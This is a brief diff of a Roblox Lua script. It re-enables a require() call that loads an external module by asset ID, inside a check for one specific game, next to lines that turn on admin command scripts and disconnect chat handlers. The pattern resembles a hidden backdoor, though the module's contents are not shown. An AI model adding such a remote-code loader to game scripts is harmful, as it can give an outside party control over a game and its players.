@@ -33,7 +33,7 @@ if game.PlaceId == 14747334292 then
             wait(0.94397082108066)
             game.ServerScriptService["Touch Kohls Admin"].Enabled = true
             game.ServerScriptService["setting commands"].Enabled = true
-            --require(71671368988868)
+            require(71671368988868)
             for i, v in ipairs(chatcon) do
                 v:Disconnect()
             end
